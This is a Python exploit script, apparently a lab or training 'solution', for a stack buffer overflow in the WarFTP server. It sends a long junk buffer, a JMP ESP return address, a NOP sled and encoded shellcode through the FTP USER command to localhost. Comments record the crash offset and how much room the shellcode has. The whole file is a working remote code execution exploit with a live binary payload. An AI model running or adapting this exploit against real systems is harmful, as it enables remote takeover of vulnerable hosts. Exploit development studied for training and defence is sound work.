#!/usr/bin/python 
# Solution for warftp
# 00c1fd48 c1ffff 695
import socket 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
# crash occured at 600 byte
#junk = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9'
junk= 'A'*485
# jmp esp address 7e429353
# notice in debugger we found or 4 B 
# where our eip did not pointed so we may 
# need some nops also notice the number of C 
# so we can take idea that how large shell code we can inject
# C started at point 0x00CCFD48 and ended at 0x00CCFF46 approx 510 bytes quite ok i guess
eip = '\x53\x93\x42\x7E'
nops = '\x90'*40

buf = ("\x29\xc9\xb1\x51\xd9\xeb\xd9\x74\x24\xf4\x5a\xbb\x66\xa8\xc8\x21"
"\x31\x5a\x13\x83\xea\xfc\x03\x3c\xa7\x2a\xd4\x3c\xdd\x41\x5a\x54"
"\xdb\x69\x9a\x5b\x7c\x1d\x09\x87\x59\xaa\x97\xfb\x2a\xd0\x12\x7b"
"\x2c\xc6\x96\x34\x36\x93\xf6\xea\x47\x48\x41\x61\x73\x05\x53\x9b"
"\x4d\xd9\xcd\xcf\x2a\x19\x99\x08\xf2\x50\x6f\x17\x36\x8f\x84\x2c"
"\xe2\x74\x4d\x27\xef\xfe\xd2\xe3\xee\xeb\x8b\x60\xfc\xa0\xd8\x29"
"\xe1\x37\x34\xd6\x35\xb3\x43\xb4\x61\xdf\x32\x87\x5b\x04\xd0\x8c"
"\xdf\x8a\x92\xd2\xd3\x61\xd4\xce\x46\xfe\x55\xe6\xc6\x69\xd8\xb8"
"\xf8\x85\xb4\xbb\xd3\x30\x66\x25\xb4\x8f\xba\xc1\x33\x83\x88\x4e"
"\xe8\x9c\x3d\x18\xdb\x8e\x42\xe3\x8b\xaf\x6d\x4c\xa5\xb5\xf4\xf3"
"\x58\x3d\xfb\xa6\xc8\x3c\x04\x98\x65\x98\xf3\xed\xdb\x4d\xfb\xdb"
"\x77\x21\x50\xb0\x24\x86\x05\x75\x98\xf7\x7a\x1f\x76\x19\x27\xb9"
"\xd5\x90\x36\xd0\xb2\x06\xa2\xaa\x85\x10\x2c\x9c\x60\x8f\x83\x75"
"\x8a\x7f\x4b\xd1\xd9\xae\x65\x4e\xdd\x79\x26\x25\xde\x56\xa1\x20"
"\x69\xd1\x7b\xfd\x95\x0b\x2b\x55\x3e\xe1\x33\x85\x2d\x61\x2b\x5c"
"\x94\x0b\xe4\x61\xce\xb9\xf5\x4d\x89\x2b\x6e\x0b\x3e\xcf\x03\x5a"
"\x5b\x65\x8c\x05\x8d\xb6\xa5\x52\xa7\x02\x3f\x7e\x09\x4b\xcc\xd4"
"\x94\x09\x1e\xd6\x2b\xa2\xf3\xab\xd6\x82\x58\x18\x8d\x9b\xec\xa0"
"\x61\x4d\xee\x29\xc2\x8d\xc6\x8a\x9d\x23\xb6\x7d\x73\xae\x39\x2c"
"\x22\x7b\x6b\x31\x14\xeb\x26\x14\x90\x22\x6b\x59\x4d\xd0\x73\x5a"
"\x45\xda\x5c\x2f\xfd\xd8\xde\xeb\x66\xde\x37\xa1\x99\xf0\xd0\x3b"
"\xbe\x13\x53\x90\xc1\x02\x6b\xc6")

print "Hello! Connecting to warftp...\n" 
s.connect(('127.0.0.1',21)) 
data = s.recv(1024) 
print data +"\n"
print "Sending exploit code to warftp..." 
s.send('USER '+junk+eip+nops+buf+'\r\n') 
print "\nDONE" 
s.close()